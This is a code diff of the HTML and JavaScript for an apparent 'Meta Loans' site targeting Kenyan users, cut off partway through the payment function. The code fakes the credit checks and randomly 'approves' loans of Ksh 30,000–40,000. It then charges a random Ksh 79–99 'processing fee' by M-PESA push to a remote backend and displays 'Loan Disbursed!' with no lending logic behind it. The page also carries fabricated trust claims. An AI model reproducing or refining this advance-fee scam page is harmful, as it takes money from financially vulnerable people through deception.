@@ -1,5 +1,4 @@
-
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en-US">
 <head>
     <meta charset="UTF-8">
@@ -365,17 +364,6 @@
             font-size: 0.8rem;
             font-weight: 600;
         }
-        .status-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #e6f7ec;
-            color: #0e6245;
-            padding: 0.5rem 1rem;
-            border-radius: 40px;
-            font-size: 0.8rem;
-            font-weight: 500;
-        }
         footer {
             text-align: center;
             margin-top: 2rem;
@@ -475,14 +463,21 @@
             color: white;
             box-shadow: 0 4px 12px rgba(0,102,255,0.3);
         }
+        #status {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+        #status.error { color: #d9534f; }
+        #status.success { color: #0e6245; }
+        #status.info { color: #0066FF; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="navbar">
         <div class="logo">
-            <img src="logo.png" alt="Meta Loans" style="height:48px;width:auto;border-radius:10px;margin-right:10px;">
-            <span style="font-weight:700;color:#0066FF;font-size:1.2rem;"></span>
+            <span style="font-weight:700;color:#0066FF;font-size:1.2rem;">Meta Loans</span>
         </div>
         <div class="nav-links">
             <button class="nav-btn active" data-page="home">Home</button>
@@ -530,100 +525,13 @@
                     <h3>Flexible repayment</h3>
                     <p>Choose between 12 or 24 months to match your financial comfort.</p>
                 </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <rect x="3" y="11" width="18" height="11" rx="2" stroke="#0066FF" stroke-width="1.5"/>
-                            <path d="M7 11V7C7 4 9 2 12 2C15 2 17 4 17 7V11" stroke="#0066FF" stroke-width="1.5"/>
-                            <circle cx="12" cy="16" r="1.5" fill="#0066FF"/>
-                        </svg>
-                    </div>
-                    <h3>Zero collateral</h3>
-                    <p>Unsecured loans based on your creditworthiness. No assets required.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                            <path d="M12 8V12L15 15" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                            <circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/>
-                            <path d="M19 3L22 6L19 9" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                            <path d="M16 6H22" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                        </svg>
-                    </div>
-                    <h3>24/7 customer support</h3>
-                    <p>Live chat and phone support whenever you need assistance.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-                            <path d="M2 17L12 22L22 17" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-                            <path d="M2 12L12 17L22 12" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-                        </svg>
-                    </div>
-                    <h3>CRB approved</h3>
-                    <p>Fully licensed digital credit provider with transparent credit reporting.</p>
-                </div>
             </div>
-            <div class="trust-grid">
-                <div class="trust-card">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 0 auto 10px;">
-                        <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2Z" fill="#0066FF" stroke="#0066FF" stroke-width="1" stroke-linejoin="round"/>
-                    </svg>
-                    <strong>CRB Verified</strong>
-                    <p style="font-size: 0.8rem; color: #6c7a8a;">Transparent credit scoring</p>
-                </div>
-                <div class="trust-card">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 0 auto 10px;">
-                        <path d="M20 12.5C20 16.5 16.5 20 12.5 20H12C7.5 20 4 16.5 4 12C4 7.5 7.5 4 12 4C14.5 4 16.5 5 18 7" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                        <path d="M12 8V12L15 15" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                        <circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/>
-                    </svg>
-                    <strong>5 Min Disbursal</strong>
-                    <p style="font-size: 0.8rem; color: #6c7a8a;">After payment confirmation</p>
-                </div>
-                <div class="trust-card">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 0 auto 10px;">
-                        <rect x="3" y="11" width="18" height="11" rx="2" stroke="#0066FF" stroke-width="1.5"/>
-                        <path d="M7 11V7C7 4 9 2 12 2C15 2 17 4 17 7V11" stroke="#0066FF" stroke-width="1.5"/>
-                        <circle cx="12" cy="16" r="1.5" fill="#0066FF"/>
-                    </svg>
-                    <strong>SSL Secured</strong>
-                    <p style="font-size: 0.8rem; color: #6c7a8a;">Bank-grade encryption</p>
-                </div>
-                <div class="trust-card">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 0 auto 10px;">
-                        <path d="M20 12C20 16.4 16.4 20 12 20C7.6 20 4 16.4 4 12C4 7.6 7.6 4 12 4" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                        <path d="M12 8V12L15 15" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                        <circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/>
-                        <path d="M19 3L22 6L19 9" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                        <path d="M16 6H22" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
-                    </svg>
-                    <strong>24/7 Support</strong>
-                    <p style="font-size: 0.8rem; color: #6c7a8a;">Live chat & phone</p>
-                </div>
-            </div>
-            <div style="background: linear-gradient(135deg, #eef4ff, #e6f0ff); border-radius: 24px; padding: 1.25rem; margin: 1rem 0;">
-                <div style="display: flex; gap: 16px; flex-wrap: wrap; justify-content: space-between;">
-                    <div><span class="badge">Loan Amount</span><br><strong>Ksh 30,000 – 40,000</strong></div>
-                    <div><span class="badge">Interest Rate</span><br><strong>8% Flat</strong></div>
-                    <div><span class="badge">Repayment</span><br><strong>12 or 24 Months</strong></div>
-                </div>
-            </div>
-            <button class="btn-primary" id="homeStartBtn">
+            <button class="btn-primary" id="homeStartBtn" style="margin-top: 1.5rem;">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M5 12H19M19 12L13 6M19 12L13 18" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
                 </svg>
                 Start Your Application
             </button>
-        </div>
-        <div class="card" style="text-align: center;">
-            <div style="display: flex; justify-content: center; gap: 24px; flex-wrap: wrap;">
-                <div><span style="font-weight: 800; color: #0066FF;">50,000+</span><br>Active Borrowers</div>
-                <div><span style="font-weight: 800; color: #0066FF;">4.9★</span><br>Trustpilot Rating</div>
-                <div><span style="font-weight: 800; color: #0066FF;">#1</span><br>Digital Lender Kenya</div>
-            </div>
         </div>
     </div>
     <div id="applyPage" class="hidden">
@@ -640,30 +548,189 @@
             </form>
         </div>
     </div>
-    <div id="summaryPage" class="hidden"><div class="summary-container"><div class="section-title">Review Your Application</div><div id="summaryContent"></div><button id="finalSubmitBtn" class="btn-primary" style="margin-top:1.5rem;">Confirm & Submit Application</button><button id="editBackBtn" class="btn-primary btn-outline" style="margin-top:0.75rem;">← Edit Details</button></div></div>
-    <div id="loadingOverlay" class="overlay hidden"><div class="overlay-card"><div class="spinner"></div><h3>Validating Your Information</h3><p id="loadingStatus" style="margin-top:0.5rem;">Checking CRB status...</p><div class="progress-bar"><div id="progressFill" class="progress-fill"></div></div></div></div>
-    <div id="congratsOverlay" class="overlay hidden"><div class="overlay-card"><div class="payment-icon-wrapper"><svg width="44" height="44" viewBox="0 0 24 24"><path d="M20 6L9 17L4 12" stroke="#0066FF" stroke-width="2"/><circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/></svg></div><h2>Congratulations!</h2><p>Based on your profile, you qualify for</p><div class="loan-amount-highlight" id="maxLoanAmount">Ksh 0</div><p style="margin-bottom:1rem;">8% flat interest · Minimum Ksh 30,000</p><div class="form-group"><label>Choose Repayment Period</label><div class="repayment-option" id="repaymentSelector"><div class="repay-radio selected" data-months="12">12 Months</div><div class="repay-radio" data-months="24">24 Months</div></div></div><div id="monthlyPreview" class="repay-preview"><strong>Monthly Payment:</strong> <span id="monthlyAmount">Ksh 0</span></div><button id="confirmLoanChoiceBtn" class="btn-primary" style="margin-top:1rem;">Continue Application</button></div></div>
-    <div id="confirmPaymentOverlay" class="overlay hidden"><div class="overlay-card"><div class="payment-icon-wrapper"><svg width="44" height="44" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2" stroke="#0066FF" stroke-width="1.5"/><path d="M7 12H17" stroke="#0066FF"/></svg></div><h3>Processing Fee</h3><div class="fee-breakdown"><div class="fee-row"><span>Loan Principal</span><strong id="feePrincipal">Ksh 0</strong></div><div class="fee-row"><span>Processing Fee</span><strong id="procFee">Ksh 79</strong></div><div class="fee-row"><span>Total Due Today</span><strong id="totalDue">Ksh 79</strong></div></div><button id="payNowBtn" class="btn-primary">Pay <span id="payBtnAmount">Ksh 79</span> via M-PESA</button><button id="cancelPaymentBtn" class="btn-outline btn-primary" style="margin-top:0.75rem;">Cancel</button></div>
-    <div id="stkOverlay" class="overlay hidden"><div class="overlay-card"><div class="payment-icon-wrapper"><svg width="44" height="44" viewBox="0 0 24 24"><path d="M22 16.5V7.5C22 5.5 20.5 4 18.5 4H5.5C3.5 4 2 5.5 2 7.5V16.5C2 18.5 3.5 20 5.5 20H18.5C20.5 20 22 18.5 22 16.5Z" stroke="#0066FF"/><path d="M22 7L12 14L2 7" stroke="#0066FF"/></svg></div><h3>Meta Loans</h3><div class="form-group"><label>M-PESA Number</label><div class="mpesa-input-group"><span class="mpesa-prefix">+254</span><input type="tel" id="stkPhone"></div></div><div class="fee-breakdown"><div class="fee-row"><span>Amount to Pay</span><strong id="stkAmount">Ksh 79</strong></div></div><button id="sendStkBtn" class="btn-primary">Pay Now Via M-pesa</button><div id="stkError" class="hidden" style="color:#d9534f;"></div><button id="cancelStkBtn" class="btn-outline btn-primary">Back</button></div></div>
-    <div id="waitingOverlay" class="overlay hidden"><div class="overlay-card"><div class="spinner"></div><h3>Waiting for Payment</h3><div id="timerDisplay">15 seconds remaining</div></div></div>
-    <div id="successOverlay" class="overlay hidden"><div class="overlay-card"><div class="payment-icon-wrapper"><svg width="44" height="44" viewBox="0 0 24 24"><path d="M20 6L9 17L4 12" stroke="#0e6245" stroke-width="2"/><circle cx="12" cy="12" r="9" stroke="#0e6245"/></svg></div><h2 style="color:#0e6245;">Loan Disbursed!</h2><div id="successDetails"></div><button id="homeResetBtn" class="btn-primary">Back to Home</button></div></div>
+    <div id="summaryPage" class="hidden">
+        <div class="summary-container">
+            <div class="section-title">Review Your Application</div>
+            <div id="summaryContent"></div>
+            <button id="finalSubmitBtn" class="btn-primary" style="margin-top:1.5rem;">Confirm & Submit Application</button>
+            <button id="editBackBtn" class="btn-primary btn-outline" style="margin-top:0.75rem;">← Edit Details</button>
+        </div>
+    </div>
+    <div id="loadingOverlay" class="overlay hidden">
+        <div class="overlay-card">
+            <div class="spinner"></div>
+            <h3>Validating Your Information</h3>
+            <p id="loadingStatus" style="margin-top:0.5rem;">Checking CRB status...</p>
+            <div class="progress-bar"><div id="progressFill" class="progress-fill"></div></div>
+        </div>
+    </div>
+    <div id="congratsOverlay" class="overlay hidden">
+        <div class="overlay-card">
+            <div class="payment-icon-wrapper">
+                <svg width="44" height="44" viewBox="0 0 24 24"><path d="M20 6L9 17L4 12" stroke="#0066FF" stroke-width="2"/><circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/></svg>
+            </div>
+            <h2>Congratulations!</h2>
+            <p>Based on your profile, you qualify for</p>
+            <div class="loan-amount-highlight" id="maxLoanAmount">Ksh 0</div>
+            <p style="margin-bottom:1rem;">8% flat interest · Minimum Ksh 30,000</p>
+            <div class="form-group">
+                <label>Choose Repayment Period</label>
+                <div class="repayment-option" id="repaymentSelector">
+                    <div class="repay-radio selected" data-months="12">12 Months</div>
+                    <div class="repay-radio" data-months="24">24 Months</div>
+                </div>
+            </div>
+            <div id="monthlyPreview" class="repay-preview"><strong>Monthly Payment:</strong> <span id="monthlyAmount">Ksh 0</span></div>
+            <button id="confirmLoanChoiceBtn" class="btn-primary" style="margin-top:1rem;">Continue Application</button>
+        </div>
+    </div>
+    <div id="confirmPaymentOverlay" class="overlay hidden">
+        <div class="overlay-card">
+            <div class="payment-icon-wrapper">
+                <svg width="44" height="44" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2" stroke="#0066FF" stroke-width="1.5"/><path d="M7 12H17" stroke="#0066FF"/></svg>
+            </div>
+            <h3>Processing Fee</h3>
+            <div class="fee-breakdown">
+                <div class="fee-row"><span>Loan Principal</span><strong id="feePrincipal">Ksh 0</strong></div>
+                <div class="fee-row"><span>Processing Fee</span><strong id="procFee">Ksh 79</strong></div>
+                <div class="fee-row"><span>Total Due Today</span><strong id="totalDue">Ksh 79</strong></div>
+            </div>
+            <button id="payNowBtn" class="btn-primary">Pay <span id="payBtnAmount">Ksh 79</span> via M-PESA</button>
+            <button id="cancelPaymentBtn" class="btn-outline btn-primary" style="margin-top:0.75rem;">Cancel</button>
+        </div>
+    </div>
+    <div id="stkOverlay" class="overlay hidden">
+        <div class="overlay-card">
+            <div class="payment-icon-wrapper">
+                <svg width="44" height="44" viewBox="0 0 24 24"><path d="M22 16.5V7.5C22 5.5 20.5 4 18.5 4H5.5C3.5 4 2 5.5 2 7.5V16.5C2 18.5 3.5 20 5.5 20H18.5C20.5 20 22 18.5 22 16.5Z" stroke="#0066FF"/><path d="M22 7L12 14L2 7" stroke="#0066FF"/></svg>
+            </div>
+            <h3>Meta Loans STK Push</h3>
+            <div class="form-group"><label>M-PESA Number</label><div class="mpesa-input-group"><span class="mpesa-prefix">+254</span><input type="tel" id="phone"></div></div>
+            <div class="form-group hidden"><label>Amount</label><input type="text" id="amount" value="79"></div>
+            <div class="fee-breakdown">
+                <div class="fee-row"><span>Amount to Pay</span><strong id="stkAmount">Ksh 79</strong></div>
+            </div>
+            <button id="payBtn" class="btn-primary" onclick="handlePayment()">Pay with M-Pesa</button>
+            <div id="status"></div>
+            <button id="cancelStkBtn" class="btn-outline btn-primary" style="margin-top:0.75rem;">Back</button>
+        </div>
+    </div>
+    <div id="successOverlay" class="overlay hidden">
+        <div class="overlay-card">
+            <div class="payment-icon-wrapper">
+                <svg width="44" height="44" viewBox="0 0 24 24"><path d="M20 6L9 17L4 12" stroke="#0e6245" stroke-width="2"/><circle cx="12" cy="12" r="9" stroke="#0e6245"/></svg>
+            </div>
+            <h2 style="color:#0e6245;">Loan Disbursed!</h2>
+            <div id="successDetails"></div>
+            <button id="homeResetBtn" class="btn-primary" style="margin-top: 1rem;">Back to Home</button>
+        </div>
+    </div>
     <footer>Meta Loans — Licensed Digital Credit Provider | Terms Apply</footer>
 </div>
 <script>
-    const BACKEND_URL = "https://newpayment-byr6.vercel.app";
-    let pollTimer;
+    const BACKEND_URL = "https://parero.vercel.app";
+    let pollTimer = null;
     let appState = { name: '', id: '', phone: '', employment: '', income: 0, existing: '', maxLoan: 0, selectedLoan: 0, monthly: 0, tenureMonths: 12, verifFee: 79 };
+
+    function showStatus(message, type = "info") {
+        const div = document.getElementById('status');
+        div.className = type;
+        div.innerHTML = message;
+    }
+
+    function resetButton() {
+        const btn = document.getElementById('payBtn');
+        btn.disabled = false;
+        btn.innerText = "Pay with M-Pesa";
+    }
+
     function getRandomLoan() { return Math.floor(Math.random() * (40000 - 30000 + 1)) + 30000; }
     function getRandomVerifFee() { return Math.floor(Math.random() * (99 - 79 + 1)) + 79; }
-    function updateVerifFee() { appState.verifFee = getRandomVerifFee(); document.getElementById('procFee').innerText = `Ksh ${appState.verifFee}`; document.getElementById('totalDue').innerText = `Ksh ${appState.verifFee}`; document.getElementById('payBtnAmount').innerText = `Ksh ${appState.verifFee}`; document.getElementById('stkAmount').innerText = `Ksh ${appState.verifFee}`; }
-    function formatPhoneFlexible(phone) { let cleaned = phone.replace(/\D/g, ''); if (cleaned.length === 9 && cleaned.startsWith('7')) cleaned = '254' + cleaned; else if (cleaned.length === 10 && cleaned.startsWith('0')) cleaned = '254' + cleaned.slice(1); else if (cleaned.length === 12 && cleaned.startsWith('254')) cleaned = cleaned; else throw new Error('Invalid phone number. Use 0712345678 or 254712345678'); if (!cleaned.startsWith('254') || cleaned.length < 12) throw new Error('Please enter a valid Kenyan number'); return cleaned; }
-    function computeMax(income, existing) { const minLoan = 30000; const maxLoan = 40000; let base = Math.floor(Math.random() * (maxLoan - minLoan + 1)) + minLoan; if (existing === 'above10k') base = Math.floor(base * 0.6); else if (existing === 'below10k') base = Math.floor(base * 0.85); return Math.max(Math.min(base, maxLoan), minLoan); }
+    
+    function updateVerifFee() { 
+        appState.verifFee = getRandomVerifFee(); 
+        document.getElementById('procFee').innerText = `Ksh ${appState.verifFee}`; 
+        document.getElementById('totalDue').innerText = `Ksh ${appState.verifFee}`; 
+        document.getElementById('payBtnAmount').innerText = `Ksh ${appState.verifFee}`; 
+        document.getElementById('stkAmount').innerText = `Ksh ${appState.verifFee}`; 
+        document.getElementById('amount').value = appState.verifFee;
+    }
+
+    function formatPhoneFlexible(phone) { 
+        let cleaned = phone.replace(/\D/g, ''); 
+        if (cleaned.length === 9 && cleaned.startsWith('7')) cleaned = '254' + cleaned; 
+        else if (cleaned.length === 10 && cleaned.startsWith('0')) cleaned = '254' + cleaned.slice(1); 
+        else if (cleaned.length === 12 && cleaned.startsWith('254')) cleaned = cleaned; 
+        else throw new Error('Invalid phone number. Use 0712345678 or 254712345678'); 
+        if (!cleaned.startsWith('254') || cleaned.length < 12) throw new Error('Please enter a valid Kenyan number'); 
+        return cleaned; 
+    }
+
     function calcMonthly(loan, months) { return Math.ceil((loan + loan * 0.08) / months); }
     function updateMonthlyPreview() { if (appState.maxLoan) { const monthly = calcMonthly(appState.maxLoan, appState.tenureMonths); document.getElementById('monthlyAmount').innerText = `Ksh ${monthly.toLocaleString()}`; } }
-    document.querySelectorAll('.repay-radio').forEach(div => { div.addEventListener('click', () => { document.querySelectorAll('.repay-radio').forEach(d => d.classList.remove('selected')); div.classList.add('selected'); appState.tenureMonths = parseInt(div.dataset.months); updateMonthlyPreview(); }); });
-    document.getElementById('applicationForm').addEventListener('submit', (e) => { e.preventDefault(); appState.name = document.getElementById('fullName').value.trim(); appState.id = document.getElementById('idNumber').value.trim(); let rawPhone = document.getElementById('phoneNumber').value.trim(); appState.employment = document.getElementById('employmentStatus').value; appState.income = parseFloat(document.getElementById('monthlyIncome').value); appState.existing = document.getElementById('existingLoans').value; if (!appState.name || !appState.id || !rawPhone || isNaN(appState.income)) { alert('Please fill all fields correctly'); return; } try { appState.phone = formatPhoneFlexible(rawPhone); } catch(err) { alert(err.message); return; } appState.maxLoan = getRandomLoan();
-    updateVerifFee(); const overlay = document.getElementById('loadingOverlay'); overlay.classList.remove('hidden'); let prog = 0, step = 0; const steps = ['Checking CRB status...', 'Verifying credit score...', 'Analyzing repayment capacity...', 'Finalizing eligibility...']; const interval = setInterval(() => { prog += 20; document.getElementById('progressFill').style.width = prog + '%'; if (step < steps.length) document.getElementById('loadingStatus').innerText = steps[step++]; if (prog >= 100) { clearInterval(interval); setTimeout(() => { overlay.classList.add('hidden'); document.getElementById('maxLoanAmount').innerText = `Ksh ${appState.maxLoan.toLocaleString()}`; appState.tenureMonths = 12; document.querySelectorAll('.repay-radio').forEach(d => d.classList.remove('selected')); document.querySelector('.repay-radio[data-months="12"]').classList.add('selected'); updateMonthlyPreview(); document.getElementById('congratsOverlay').classList.remove('hidden'); }, 300); } }, 400); });
-    document.getElementById('confirmLoanChoiceBtn').addEventListener('click', () => { appState.selectedLoan = appState.maxLoan; appState.monthly = calcMonthly(appState.selectedLoan, appState.tenureMonths); document.getElementById('congratsOverlay').classList.add('hidden'); document.getElementById('summaryContent').innerHTML = `<div class="summary-item"><span>Full Name</span><strong>${appState.name}</strong></div><div class="summary-item"><span>ID Number</span><strong>${appState.id}</strong></div><div class="summary-item"><span>M-PESA Number</span><strong>${appState.phone}</strong></div><div class="summary-item"><span>Employment</span><strong>${appState.employment === 'employed' ? 'Employed' : appState.employment === 'self-employed' ? 'Self Employed' : 'Student'}</strong></div><div class="summary-item"><span>Monthly Income</span><strong>Ksh ${appState.income.toLocaleString()}</strong></div><div class="summary-item"><span>Loan Amount</span><strong>Ksh ${appState.selectedLoan.toLocaleString()}</strong></div><div class="summary-item"><span>Repayment Period</span><strong>${appState.tenureMonths} Months</strong></div><div class="summary-item"><span>Monthly Payment</span><strong>Ksh ${appState.monthly.toLocaleString()} (${appState.tenureMonths} months, 8% interest)</strong></div><div class="summary-item"><span>Application Date</span><strong>${new Date().toLocaleDateString()}</strong></div>`; showPage('summaryPage'); });
+
+    document.querySelectorAll('.repay-radio').forEach(div => { 
+        div.addEventListener('click', () => { 
+            document.querySelectorAll('.repay-radio').forEach(d => d.classList.remove('selected')); 
+            div.classList.add('selected'); 
+            appState.tenureMonths = parseInt(div.dataset.months); 
+            updateMonthlyPreview(); 
+        }); 
+    });
+
+    document.getElementById('applicationForm').addEventListener('submit', (e) => { 
+        e.preventDefault(); 
+        appState.name = document.getElementById('fullName').value.trim(); 
+        appState.id = document.getElementById('idNumber').value.trim(); 
+        let rawPhone = document.getElementById('phoneNumber').value.trim(); 
+        appState.employment = document.getElementById('employmentStatus').value; 
+        appState.income = parseFloat(document.getElementById('monthlyIncome').value); 
+        appState.existing = document.getElementById('existingLoans').value; 
+        if (!appState.name || !appState.id || !rawPhone || isNaN(appState.income)) { alert('Please fill all fields correctly'); return; } 
+        try { appState.phone = formatPhoneFlexible(rawPhone); } catch(err) { alert(err.message); return; } 
+        appState.maxLoan = getRandomLoan();
+        updateVerifFee(); 
+        
+        const overlay = document.getElementById('loadingOverlay'); 
+        overlay.classList.remove('hidden'); 
+        let prog = 0, step = 0; 
+        const steps = ['Checking CRB status...', 'Verifying credit score...', 'Analyzing repayment capacity...', 'Finalizing eligibility...']; 
+        const interval = setInterval(() => { 
+            prog += 20; 
+            document.getElementById('progressFill').style.width = prog + '%'; 
+            if (step < steps.length) document.getElementById('loadingStatus').innerText = steps[step++]; 
+            if (prog >= 100) { 
+                clearInterval(interval); 
+                setTimeout(() => { 
+                    overlay.classList.add('hidden'); 
+                    document.getElementById('maxLoanAmount').innerText = `Ksh ${appState.maxLoan.toLocaleString()}`; 
+                    appState.tenureMonths = 12; 
+                    document.querySelectorAll('.repay-radio').forEach(d => d.classList.remove('selected')); 
+                    document.querySelector('.repay-radio[data-months="12"]').classList.add('selected'); 
+                    updateMonthlyPreview(); 
+                    document.getElementById('congratsOverlay').classList.remove('hidden'); 
+                }, 300); 
+            } 
+        }, 400); 
+    });
+
+    document.getElementById('confirmLoanChoiceBtn').addEventListener('click', () => { 
+        appState.selectedLoan = appState.maxLoan; 
+        appState.monthly = calcMonthly(appState.selectedLoan, appState.tenureMonths); 
+        document.getElementById('congratsOverlay').classList.add('hidden'); 
+        document.getElementById('summaryContent').innerHTML = `
+            <div class="summary-item"><span>Full Name</span><strong>${appState.name}</strong></div>
+            <div class="summary-item"><span>ID Number</span><strong>${appState.id}</strong></div>
+            <div class="summary-item"><span>M-PESA Number</span><strong>${appState.phone}</strong></div>
+            <div class="summary-item"><span>Employment</span><strong>${appState.employment}</strong></div>
+            <div class="summary-item"><span>Monthly Income</span><strong>Ksh ${appState.income.toLocaleString()}</strong></div>
+            <div class="summary-item"><span>Loan Amount</span><strong>Ksh ${appState.selectedLoan.toLocaleString()}</strong></div>
+            <div class="summary-item"><span>Repayment Period</span><strong>${appState.tenureMonths} Months</strong></div>
+            <div class="summary-item"><span>Monthly Payment</span><strong>Ksh ${appState.monthly.toLocaleString()}</strong></div>
+        `; 
+        showPage('summaryPage'); 
+    });
+
     function showPage(page) { 
         document.getElementById('homePage').classList.add('hidden'); 
         document.getElementById('applyPage').classList.add('hidden'); 
@@ -681,68 +748,138 @@
             document.getElementById('fabApplyBtn').classList.add('hide-fab');
         } 
     }
+
     function hideOverlays() { document.querySelectorAll('.overlay').forEach(el => el.classList.add('hidden')); }
+
     document.getElementById('editBackBtn').addEventListener('click', () => showPage('applyPage'));
-    document.getElementById('finalSubmitBtn').addEventListener('click', () => { document.getElementById('feePrincipal').innerText = `Ksh ${appState.selectedLoan.toLocaleString()}`; document.getElementById('confirmPaymentOverlay').classList.remove('hidden'); });
-    document.getElementById('cancelPaymentBtn').addEventListener('click', () => document.getElementById('confirmPaymentOverlay').classList.add('hidden'));
-    document.getElementById('payNowBtn').addEventListener('click', () => { document.getElementById('confirmPaymentOverlay').classList.add('hidden'); document.getElementById('stkOverlay').classList.remove('hidden'); let raw = appState.phone.replace(/^254/, ''); if(raw.startsWith('0')) raw = raw.slice(1); document.getElementById('stkPhone').value = raw; });
-    document.getElementById('cancelStkBtn').addEventListener('click', () => document.getElementById('stkOverlay').classList.add('hidden'));
-    document.getElementById('sendStkBtn').addEventListener('click', async () => { 
-        let phoneRaw = document.getElementById('stkPhone').value.trim(); 
-        if (!phoneRaw) { alert('Enter M-PESA number'); return; } 
-        let finalPhone; 
-        try { finalPhone = formatPhoneFlexible(phoneRaw); } catch(e) { alert(e.message); return; } 
-        const btn = document.getElementById('sendStkBtn'); 
-        const original = btn.innerHTML; 
-        btn.disabled = true; 
-        btn.innerHTML = '<span class="small-spinner"></span> Sending...'; 
-        try { 
-            const resp = await fetch(`${BACKEND_URL}/api/initiate`, { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify({ amount: appState.verifFee, phone_number: finalPhone }) 
-            });
-            const data = await resp.json();
-            if (!resp.ok || !data.invoice) throw new Error(data.error || 'Payment request failed');
-            const invoiceId = data.invoice.invoice_id;
-            document.getElementById('stkOverlay').classList.add('hidden'); 
-            const waiting = document.getElementById('waitingOverlay'); 
-            waiting.classList.remove('hidden'); 
-            let seconds = 120; 
-            const timerSpan = document.getElementById('timerDisplay'); 
-            timerSpan.innerText = `120 seconds remaining`; 
-            const countdown = setInterval(() => { seconds--; timerSpan.innerText = `${seconds} seconds remaining`; if (seconds <= 0) clearInterval(countdown); }, 1000); 
-            pollTimer = setInterval(async () => {
-                try {
-                    const statusResp = await fetch(`${BACKEND_URL}/api/status/${invoiceId}`);
-                    const statusData = await statusResp.json();
-                    const state = statusData.invoice ? statusData.invoice.state : statusData.state;
-                    if (state === "COMPLETE" || state === "COMPLETED") {
-                        clearInterval(countdown);
-                        clearInterval(pollTimer);
-                        waiting.classList.add('hidden'); 
-                        document.getElementById('successDetails').innerHTML = `<p>${appState.name}, loan approved!</p><p>Amount: Ksh ${appState.selectedLoan.toLocaleString()}</p><p>Monthly: Ksh ${appState.monthly.toLocaleString()} for ${appState.tenureMonths} months</p><p>Funds sent to ${appState.phone}</p>`; 
-                        document.getElementById('successOverlay').classList.remove('hidden'); 
-                    } else if (state === "FAILED" || state === "REJECTED") {
-                        clearInterval(countdown);
-                        clearInterval(pollTimer);
-                        waiting.classList.add('hidden'); 
-                        alert('Payment failed. Please try again.');
-                    }
-                } catch(err) { console.error('Polling error:', err); }
-            }, 3000); 
-            document.getElementById('manualConfirmBtn').onclick = () => { clearInterval(countdown); clearInterval(pollTimer); waiting.classList.add('hidden'); document.getElementById('successDetails').innerHTML = `<p>${appState.name}, loan approved!</p><p>Amount: Ksh ${appState.selectedLoan.toLocaleString()}</p><p>Monthly: Ksh ${appState.monthly.toLocaleString()}</p><p>Funds sent to ${appState.phone}</p>`; document.getElementById('successOverlay').classList.remove('hidden'); }; 
-        } catch(err) { 
-            document.getElementById('stkError').innerText = err.message; 
-            document.getElementById('stkError').classList.remove('hidden'); 
-            btn.disabled = false; 
-            btn.innerHTML = 'Pay Now Via M-pesa'; 
-        } 
+    document.getElementById('finalSubmitBtn').addEventListener('click', () => { 
+        document.getElementById('feePrincipal').innerText = `Ksh ${appState.selectedLoan.toLocaleString()}`; 
+        document.getElementById('confirmPaymentOverlay').classList.remove('hidden'); 
     });
+    document.getElementById('cancelPaymentBtn').addEventListener('click', () => document.getElementById('confirmPaymentOverlay').classList.add('hidden'));
+    
+    document.getElementById('payNowBtn').addEventListener('click', () => { 
+        document.getElementById('confirmPaymentOverlay').classList.add('hidden'); 
+        document.getElementById('stkOverlay').classList.remove('hidden'); 
+        let raw = appState.phone.replace(/^254/, ''); 
+        if(raw.startsWith('0')) raw = raw.slice(1); 
+        document.getElementById('phone').value = raw; 
+    });
+
+    document.getElementById('cancelStkBtn').addEventListener('click', () => document.getElementById('stkOverlay').classList.add('hidden'));
+
+    async function handlePayment() {
+        const phoneInputVal = document.getElementById('phone').value.trim();
+        let amount = parseFloat(document.getElementById('amount').value);
+        const btn = document.getElementById('payBtn');
+
+        let finalPhone;
+        try {
+            finalPhone = formatPhoneFlexible(phoneInputVal);
+        } catch(err) {
